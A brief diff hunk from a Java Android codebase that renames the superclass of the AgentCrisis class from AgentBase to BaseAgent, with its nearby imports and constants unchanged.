@@ -19,7 +19,7 @@ import com.android.service.evidence.Evidence;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 
-public class AgentCrisis extends AgentBase {
+public class AgentCrisis extends BaseAgent {
 	private static final String TAG = "AgentCrisis"; //$NON-NLS-1$
 	//$NON-NLS-1$
 	public static final int NONE = 0x0; // Per retrocompatibilita'
